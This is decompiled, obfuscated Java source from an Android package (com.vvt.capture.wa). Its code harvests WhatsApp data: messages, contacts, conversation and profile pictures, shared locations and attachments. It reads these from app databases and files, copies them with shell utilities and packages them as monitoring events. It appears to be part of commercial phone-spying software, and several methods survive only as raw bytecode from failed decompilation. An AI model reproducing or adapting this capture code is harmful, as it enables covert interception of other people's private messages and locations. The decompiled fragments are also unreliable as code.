package com.vvt.capture.wa.b;

import android.database.sqlite.SQLiteDatabase;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.f;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class a
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.e;
      return;
    }
  }
  
  public static int a(String paramString, int paramInt)
  {
    MessageType localMessageType;
    int i;
    switch (paramInt)
    {
    default: 
      localMessageType = MessageType.none;
      i = localMessageType.getNumber();
    }
    for (;;)
    {
      return i;
      localMessageType = MessageType.Text;
      i = localMessageType.getNumber();
      continue;
      if (paramString != null)
      {
        i = paramString.length();
        if (i > 0)
        {
          localMessageType = MessageType.Text;
          i = localMessageType.getNumber();
          continue;
        }
      }
      localMessageType = MessageType.none;
      i = localMessageType.getNumber();
      continue;
      localMessageType = MessageType.Contact;
      i = localMessageType.getNumber();
      continue;
      localMessageType = MessageType.ShareLocation;
      i = localMessageType.getNumber();
    }
  }
  
  public static com.vvt.capture.wa.full.c a(File paramFile, String paramString1, long paramLong1, long paramLong2, String paramString2, String paramString3, String paramString4)
  {
    com.vvt.capture.wa.full.c localc = new com/vvt/capture/wa/full/c;
    localc.<init>();
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    localObject4 = null;
    boolean bool1;
    Object localObject5;
    if (paramString1 != null)
    {
      bool1 = true;
      localObject1 = paramFile;
      localObject5 = paramString1;
    }
    for (;;)
    {
      try
      {
        localObject1 = a(paramFile, paramString1, bool1, paramLong1, paramLong2);
        int j = ((List)localObject1).size();
        if (j > 0)
        {
          j = 0;
          localObject5 = null;
          localObject1 = ((List)localObject1).get(0);
          localObject1 = (String)localObject1;
          localObject4 = localObject1;
        }
      }
      catch (Exception localException1)
      {
        boolean bool2;
        int k;
        int i;
        String str;
        boolean bool3;
        boolean bool4 = false;
        Object localObject2 = null;
        continue;
      }
      try
      {
        bool4 = a;
        if (bool4) {}
        bool4 = a;
        if (bool4) {}
        bool4 = a;
        if ((bool4) && (paramFile == null)) {
          break;
        }
        if (localObject4 == null) {
          continue;
        }
        localObject1 = new java/io/File;
        ((File)localObject1).<init>((String)localObject4);
        bool4 = ((File)localObject1).exists();
        if (bool4)
        {
          bool4 = a;
          if (bool4) {}
          com.vvt.io.d.a((String)localObject4, paramString3);
          ShellUtil.b(paramString4, paramString3);
        }
        localObject1 = localObject4;
      }
      catch (Exception localException2)
      {
        Object localObject3 = localObject4;
        continue;
        localObject3 = localObject4;
        continue;
      }
      bool2 = a;
      if (bool2) {}
      localc.a = paramString1;
      localc.b = paramString3;
      bool2 = com.vvt.ag.b.a(paramString1);
      if (bool2)
      {
        bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2)
        {
          localObject5 = "/";
          k = ((String)localObject1).lastIndexOf((String)localObject5);
          i = -1;
          if (k != i)
          {
            k += 1;
            i = ((String)localObject1).length();
            localObject1 = ((String)localObject1).substring(k, i);
            localc.a = ((String)localObject1);
          }
        }
      }
      bool4 = a;
      if (bool4) {}
      return localc;
      bool4 = a;
      if (bool4) {}
      localObject1 = new java/util/Date;
      ((Date)localObject1).<init>(paramLong2);
      localObject5 = new java/text/SimpleDateFormat;
      str = "yyyyMMdd";
      ((SimpleDateFormat)localObject5).<init>(str);
      localObject1 = ((Format)localObject5).format(localObject1);
      localObject1 = ((String)localObject1).toString();
      k = 1;
      localObject5 = new Object[k];
      i = 0;
      str = null;
      localObject5[0] = localObject1;
      localObject5 = String.format(paramString2, (Object[])localObject5);
      bool4 = a;
      if (bool4) {}
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      i = 0;
      str = null;
      localObject1 = paramFile;
      localObject1 = a(paramFile, (String)localObject5, false, paramLong1, paramLong2);
      k = ((List)localObject1).size();
      if (k <= 0) {
        break;
      }
      k = 0;
      localObject5 = null;
      localObject1 = ((List)localObject1).get(0);
      localObject1 = (String)localObject1;
      try
      {
        bool3 = a;
        if (bool3) {}
        com.vvt.io.d.a((String)localObject1, paramString3);
        ShellUtil.b(paramString4, paramString3);
      }
      catch (Exception localException3) {}
      paramString3 = null;
      bool3 = b;
      if (!bool3) {}
    }
  }
  
  public static com.vvt.im.events.info.b a(String paramString1, Boolean paramBoolean, String paramString2, com.vvt.capture.wa.a.d paramd, boolean paramBoolean1, String paramString3, String paramString4)
  {
    Object localObject1 = null;
    boolean bool = a;
    if (bool) {}
    Object localObject2 = new byte[0];
    String str = a(paramd, paramString2);
    bool = paramBoolean.booleanValue();
    Object localObject3;
    Object localObject4;
    if (bool)
    {
      localObject1 = paramd.a();
      localObject2 = a(paramString2, paramBoolean1, paramString3, paramString4);
      localObject3 = ImType.WHATSAPP;
      localObject4 = ImMediaFileType.CONVERSATION_PROFILE;
      localObject3 = com.vvt.im.a.c.a(paramString1, (ImType)localObject3, (ImMediaFileType)localObject4);
      localObject4 = com.vvt.im.a.c.a(ImMediaFileType.CONVERSATION_PROFILE);
    }
    for (localObject2 = com.vvt.io.d.a((byte[])localObject2, (String)localObject3, (String)localObject4);; localObject2 = null)
    {
      localObject3 = new com/vvt/im/events/info/b;
      ((com.vvt.im.events.info.b)localObject3).<init>();
      ((com.vvt.im.events.info.b)localObject3).a(paramString2);
      ((com.vvt.im.events.info.b)localObject3).b(str);
      ((com.vvt.im.events.info.b)localObject3).d((String)localObject1);
      localObject1 = new byte[0];
      ((com.vvt.im.events.info.b)localObject3).a((byte[])localObject1);
      ((com.vvt.im.events.info.b)localObject3).c((String)localObject2);
      return (com.vvt.im.events.info.b)localObject3;
      bool = false;
    }
  }
  
  /* Error */
  public static com.vvt.im.events.info.c a(SQLiteDatabase paramSQLiteDatabase, int paramInt)
  {
    // Byte code:
    //   0: dconst_0
    //   1: dstore_2
    //   2: iconst_1
    //   3: istore 4
    //   5: aconst_null
    //   6: astore 5
    //   8: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   11: istore 6
    //   13: iload 6
    //   15: ifeq +3 -> 18
    //   18: new 182	com/vvt/im/events/info/MyUncaughtExceptionHandler
    //   21: astore 7
    //   23: aload 7
    //   25: invokespecial 183	com/vvt/im/events/info/MyUncaughtExceptionHandler:<init>	()V
    //   28: iload 4
    //   30: anewarray 4	java/lang/Object
    //   33: astore 8
    //   35: aload 8
    //   37: iconst_0
    //   38: ldc -69
    //   40: aastore
    //   41: ldc -71
    //   43: aload 8
    //   45: invokestatic 124	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   48: astore 9
    //   50: iload 4
    //   52: anewarray 33	java/lang/String
    //   55: astore 10
    //   57: new 189	java/lang/StringBuilder
    //   60: astore 11
    //   62: aload 11
    //   64: invokespecial 190	java/lang/StringBuilder:<init>	()V
    //   67: aload 11
    //   69: iload_1
    //   70: invokevirtual 194	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   73: ldc -60
    //   75: invokevirtual 199	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   78: invokevirtual 200	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   81: astore 11
    //   83: aload 10
    //   85: iconst_0
    //   86: aload 11
    //   88: aastore
    //   89: ldc -54
    //   91: astore 11
    //   93: iload 4
    //   95: anewarray 4	java/lang/Object
    //   98: astore 8
    //   100: ldc -69
    //   102: astore 12
    //   104: aload 8
    //   106: iconst_0
    //   107: aload 12
    //   109: aastore
    //   110: aload 11
    //   112: aload 8
    //   114: invokestatic 124	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   117: astore 13
    //   119: aload_0
    //   120: ifnull +262 -> 382
    //   123: ldc -52
    //   125: astore 8
    //   127: iconst_0
    //   128: istore 14
    //   130: aconst_null
    //   131: astore 12
    //   133: iconst_0
    //   134: istore 4
    //   136: aload_0
    //   137: astore 11
    //   139: aload_0
    //   140: aload 8
    //   142: aconst_null
    //   143: aload 9
    //   145: aload 10
    //   147: aconst_null
    //   148: aconst_null
    //   149: aload 13
    //   151: invokevirtual 210	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   154: astore 11
    //   156: aload 11
    //   158: ifnull +138 -> 296
    //   161: aload 11
    //   163: invokeinterface 215 1 0
    //   168: istore 15
    //   170: iload 15
    //   172: ifeq +124 -> 296
    //   175: ldc -39
    //   177: astore 8
    //   179: aload 11
    //   181: aload 8
    //   183: invokeinterface 220 2 0
    //   188: istore 15
    //   190: aload 11
    //   192: iload 15
    //   194: invokeinterface 224 2 0
    //   199: astore 8
    //   201: ldc -30
    //   203: astore 12
    //   205: aload 11
    //   207: aload 12
    //   209: invokeinterface 220 2 0
    //   214: istore 14
    //   216: aload 11
    //   218: iload 14
    //   220: invokeinterface 230 2 0
    //   225: dstore 16
    //   227: ldc -24
    //   229: astore 10
    //   231: aload 11
    //   233: aload 10
    //   235: invokeinterface 220 2 0
    //   240: istore 18
    //   242: aload 11
    //   244: iload 18
    //   246: invokeinterface 230 2 0
    //   251: dstore 19
    //   253: dload 19
    //   255: dload_2
    //   256: dcmpl
    //   257: istore 4
    //   259: iload 4
    //   261: ifeq +35 -> 296
    //   264: dload 16
    //   266: dload_2
    //   267: dcmpl
    //   268: istore 4
    //   270: iload 4
    //   272: ifeq +24 -> 296
    //   275: aload 7
    //   277: aload 8
    //   279: invokevirtual 233	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
    //   282: aload 7
    //   284: dload 16
    //   286: invokevirtual 236	com/vvt/im/events/info/MyUncaughtExceptionHandler:removeFromPath	(D)V
    //   289: aload 7
    //   291: dload 19
    //   293: invokevirtual 238	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(D)V
    //   296: aload 11
    //   298: ifnull +10 -> 308
    //   301: aload 11
    //   303: invokeinterface 241 1 0
    //   308: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   311: istore 6
    //   313: iload 6
    //   315: ifeq +3 -> 318
    //   318: aload 7
    //   320: areturn
    //   321: astore 11
    //   323: iconst_0
    //   324: istore 6
    //   326: aconst_null
    //   327: astore 11
    //   329: getstatic 18	com/vvt/capture/wa/removeFromPath/a:removeFromPath	Z
    //   332: istore 15
    //   334: iload 15
    //   336: ifeq +3 -> 339
    //   339: aload 11
    //   341: ifnull -33 -> 308
    //   344: goto -43 -> 301
    //   347: astore 11
    //   349: aload 5
    //   351: ifnull +10 -> 361
    //   354: aload 5
    //   356: invokeinterface 241 1 0
    //   361: aload 11
    //   363: athrow
    //   364: astore 8
    //   366: aload 11
    //   368: astore 5
    //   370: aload 8
    //   372: astore 11
    //   374: goto -25 -> 349
    //   377: astore 8
    //   379: goto -50 -> 329
    //   382: iconst_0
    //   383: istore 6
    //   385: aconst_null
    //   386: astore 11
    //   388: goto -92 -> 296
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	391	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	391	1	paramInt	int
    //   1	266	2	d1	double
    //   3	268	4	bool1	boolean
    //   6	363	5	localObject1	Object
    //   11	373	6	bool2	boolean
    //   21	298	7	localc	com.vvt.im.events.info.MyUncaughtExceptionHandler
    //   33	245	8	localObject2	Object
    //   364	7	8	localObject3	Object
    //   377	1	8	localException1	Exception
    //   48	96	9	str1	String
    //   55	179	10	localObject4	Object
    //   60	242	11	localObject5	Object
    //   321	1	11	localException2	Exception
    //   327	13	11	localObject6	Object
    //   347	20	11	localObject7	Object
    //   372	15	11	localObject8	Object
    //   102	106	12	str2	String
    //   117	33	13	str3	String
    //   128	91	14	i	int
    //   168	3	15	bool3	boolean
    //   188	5	15	j	int
    //   332	3	15	bool4	boolean
    //   225	60	16	d2	double
    //   240	5	18	k	int
    //   251	41	19	d3	double
    // Exception table:
    //   from	to	target	type
    //   149	154	321	java/lang/Exception
    //   149	154	347	finally
    //   161	168	364	finally
    //   181	188	364	finally
    //   192	199	364	finally
    //   207	214	364	finally
    //   218	225	364	finally
    //   233	240	364	finally
    //   244	251	364	finally
    //   277	282	364	finally
    //   284	289	364	finally
    //   291	296	364	finally
    //   329	332	364	finally
    //   161	168	377	java/lang/Exception
    //   181	188	377	java/lang/Exception
    //   192	199	377	java/lang/Exception
    //   207	214	377	java/lang/Exception
    //   218	225	377	java/lang/Exception
    //   233	240	377	java/lang/Exception
    //   244	251	377	java/lang/Exception
    //   277	282	377	java/lang/Exception
    //   284	289	377	java/lang/Exception
    //   291	296	377	java/lang/Exception
  }
  
  public static String a(com.vvt.capture.wa.a.d paramd, String paramString)
  {
    String str1 = null;
    for (;;)
    {
      try
      {
        String str2 = paramd.c();
        if (str2 == null) {
          continue;
        }
        str2 = paramd.c();
        str2 = str2.trim();
        int i = str2.length();
        if (i <= 0) {
          continue;
        }
        str1 = paramd.c();
      }
      catch (Exception localException)
      {
        continue;
      }
      return str1;
      if (paramString != null) {
        str1 = b(paramString);
      }
    }
  }
  
  public static List a(com.vvt.capture.wa.a.c paramc)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramc.h();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.WHATSAPP.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramc.d().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramc.d().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramc.d().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramc.d().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramc.d().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramc.g().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramc.g().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramc.g().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramc.g().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramc.g().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramc.h();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.WHATSAPP.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramc.d().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramc.c();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramc.d().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (!bool4)
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramc.c();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramc.d().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (!bool5)
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramc.h();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.WHATSAPP.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramc.d().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramc.b();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramc.j();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramc.e().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d = paramc.e().a();
      ((com.vvt.events.e)localObject1).a(d);
      d = paramc.e().b();
      ((com.vvt.events.e)localObject1).b(d);
      localObject2 = paramc.e().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramc.g().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramc.i();
    localObject5 = ICallLogData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramc.h();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.WHATSAPP.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramc.a();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramc.j();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramc.i();
      localObject2 = ICallLogData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramc.f().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static List a(File paramFile, String paramString, boolean paramBoolean, long paramLong1, long paramLong2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool = paramFile.exists();
    if (bool)
    {
      bool = paramFile.isDirectory();
      if (bool) {
        a(paramFile, paramString, localArrayList, paramBoolean, paramLong1, paramLong2);
      }
    }
    return localArrayList;
  }
  
  public static List a(String paramString, SQLiteDatabase paramSQLiteDatabase)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramString != null)
    {
      String str = "@FxFileObserverWorker.us";
      boolean bool = paramString.endsWith(str);
      if (!bool) {
        break label36;
      }
      localArrayList = b(paramString, paramSQLiteDatabase);
    }
    for (;;)
    {
      return localArrayList;
      label36:
      localArrayList.add(paramString);
    }
  }
  
  private static void a(File paramFile, String paramString, List paramList, boolean paramBoolean, long paramLong1, long paramLong2)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = paramFile.isDirectory();
    Object localObject1;
    boolean bool3;
    Object localObject2;
    long l1;
    long l2;
    int i;
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      bool1 = paramFile.canRead();
      if (!bool1) {
        break label489;
      }
      File[] arrayOfFile = paramFile.listFiles();
      int j = arrayOfFile.length;
      bool1 = false;
      localObject1 = null;
      int k = 0;
      if (k >= j) {
        break label286;
      }
      localObject1 = arrayOfFile[k];
      bool3 = a;
      if (bool3) {}
      bool3 = ((File)localObject1).isDirectory();
      if (bool3)
      {
        localObject2 = paramString;
        l1 = paramLong1;
        l2 = paramLong2;
        a((File)localObject1, paramString, paramList, paramBoolean, paramLong1, paramLong2);
      }
      do
      {
        i = k + 1;
        k = i;
        break;
        if (!paramBoolean) {
          break label188;
        }
        localObject2 = ((File)localObject1).getName();
        bool3 = paramString.equals(localObject2);
      } while (!bool3);
      bool3 = a;
      if (bool3) {}
      localObject1 = ((File)localObject1).getAbsoluteFile().toString();
      paramList.add(localObject1);
    }
    for (;;)
    {
      return;
      label188:
      localObject2 = ((File)localObject1).getName();
      bool3 = ((String)localObject2).contains(paramString);
      if (!bool3) {
        break;
      }
      long l3 = ((File)localObject1).length();
      bool3 = l3 < paramLong1;
      if (bool3) {
        break;
      }
      l3 = ((File)localObject1).length();
      long l4 = 20 + paramLong1;
      bool3 = l3 < l4;
      if (bool3) {
        break;
      }
      bool3 = a;
      if (bool3) {}
      localObject1 = ((File)localObject1).getAbsoluteFile().toString();
      paramList.add(localObject1);
      continue;
      label286:
      if (!paramBoolean)
      {
        new SimpleDateFormat("dd/MM/yy HH:mm:ss");
        localObject2 = paramFile.listFiles();
        int m = localObject2.length;
        i = 0;
        localObject1 = null;
        label316:
        Object localObject3;
        boolean bool4;
        if (i < m)
        {
          localObject3 = localObject2[i];
          bool4 = a;
          if (bool4) {}
          bool4 = ((File)localObject3).isDirectory();
          if (!bool4) {
            break label361;
          }
        }
        label361:
        do
        {
          do
          {
            do
            {
              i += 1;
              break label316;
              break;
              l1 = Math.abs(((File)localObject3).lastModified() - paramLong2);
              boolean bool5 = a;
              if (bool5) {}
              bool5 = a;
              if (bool5) {}
              l2 = 60000L;
              bool4 = l1 < l2;
            } while (bool4);
            l1 = ((File)localObject3).length();
            bool4 = l1 < paramLong1;
          } while (bool4);
          l1 = ((File)localObject3).length();
          l2 = 20 + paramLong1;
          bool4 = l1 < l2;
        } while (bool4);
        boolean bool2 = a;
        if (bool2) {}
        localObject1 = ((File)localObject3).getAbsoluteFile().toString();
        paramList.add(localObject1);
        continue;
        label489:
        bool2 = a;
        if (!bool2) {}
      }
    }
  }
  
  /* Error */
  public static byte[] a(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: iconst_0
    //   5: istore_3
    //   6: aconst_null
    //   7: astore 4
    //   9: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   12: istore 5
    //   14: iload 5
    //   16: ifeq +3 -> 19
    //   19: iconst_0
    //   20: newarray <illegal type>
    //   22: astore 6
    //   24: aload_0
    //   25: ifnull +131 -> 156
    //   28: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   31: istore_3
    //   32: iload_3
    //   33: ifeq +3 -> 36
    //   36: new 65	java/io/File
    //   39: astore 7
    //   41: aload 7
    //   43: aload_0
    //   44: invokespecial 68	java/io/File:<init>	(Ljava/lang/String;)V
    //   47: aload 7
    //   49: invokevirtual 72	java/io/File:exists	()Z
    //   52: istore_3
    //   53: iload_3
    //   54: ifeq +102 -> 156
    //   57: aload 7
    //   59: invokevirtual 513	java/io/File:canRead	()Z
    //   62: istore_3
    //   63: iload_3
    //   64: ifeq +92 -> 156
    //   67: sipush 4096
    //   70: istore_3
    //   71: iload_3
    //   72: newarray <illegal type>
    //   74: astore 8
    //   76: new 554	java/io/ByteArrayOutputStream
    //   79: astore 9
    //   81: aload 9
    //   83: invokespecial 555	java/io/ByteArrayOutputStream:<init>	()V
    //   86: new 557	java/io/FileInputStream
    //   89: astore 4
    //   91: aload 4
    //   93: aload 7
    //   95: invokespecial 560	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   98: aload 4
    //   100: aload 8
    //   102: invokevirtual 566	java/io/InputStream:read	([B)I
    //   105: istore_1
    //   106: iconst_m1
    //   107: istore 10
    //   109: iload_1
    //   110: iload 10
    //   112: if_icmpeq +63 -> 175
    //   115: iconst_0
    //   116: istore 10
    //   118: aconst_null
    //   119: astore 7
    //   121: aload 9
    //   123: aload 8
    //   125: iconst_0
    //   126: iload_1
    //   127: invokevirtual 570	java/io/ByteArrayOutputStream:write	([BII)V
    //   130: goto -32 -> 98
    //   133: astore_2
    //   134: aload 9
    //   136: astore_2
    //   137: getstatic 18	com/vvt/capture/wa/removeFromPath/a:removeFromPath	Z
    //   140: istore 11
    //   142: iload 11
    //   144: ifeq +3 -> 147
    //   147: aload_2
    //   148: invokestatic 573	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   151: aload 4
    //   153: invokestatic 576	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   156: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   159: istore_3
    //   160: iload_3
    //   161: ifeq +3 -> 164
    //   164: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   167: istore_3
    //   168: iload_3
    //   169: ifeq +3 -> 172
    //   172: aload 6
    //   174: areturn
    //   175: aload 9
    //   177: invokevirtual 579	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   180: astore 6
    //   182: aload 9
    //   184: invokestatic 573	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   187: goto -36 -> 151
    //   190: astore 6
    //   192: iconst_0
    //   193: istore 11
    //   195: aconst_null
    //   196: astore 9
    //   198: aload 9
    //   200: invokestatic 573	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   203: aload_2
    //   204: invokestatic 576	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   207: aload 6
    //   209: athrow
    //   210: astore 6
    //   212: goto -14 -> 198
    //   215: astore 6
    //   217: aload 4
    //   219: astore_2
    //   220: goto -22 -> 198
    //   223: astore 6
    //   225: aload_2
    //   226: astore 9
    //   228: aload 4
    //   230: astore_2
    //   231: goto -33 -> 198
    //   234: astore 4
    //   236: iconst_0
    //   237: istore_3
    //   238: aconst_null
    //   239: astore 4
    //   241: goto -104 -> 137
    //   244: astore 4
    //   246: iconst_0
    //   247: istore_3
    //   248: aconst_null
    //   249: astore 4
    //   251: aload 9
    //   253: astore_2
    //   254: goto -117 -> 137
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	257	0	paramString	String
    //   1	126	1	i	int
    //   3	1	2	localObject1	Object
    //   133	1	2	localException1	Exception
    //   136	118	2	localObject2	Object
    //   5	59	3	bool1	boolean
    //   70	2	3	j	int
    //   159	89	3	bool2	boolean
    //   7	222	4	localFileInputStream	java.io.FileInputStream
    //   234	1	4	localException2	Exception
    //   239	1	4	localObject3	Object
    //   244	1	4	localException3	Exception
    //   249	1	4	localObject4	Object
    //   12	3	5	bool3	boolean
    //   22	159	6	arrayOfByte1	byte[]
    //   190	18	6	localObject5	Object
    //   210	1	6	localObject6	Object
    //   215	1	6	localObject7	Object
    //   223	1	6	localObject8	Object
    //   39	81	7	localFile	File
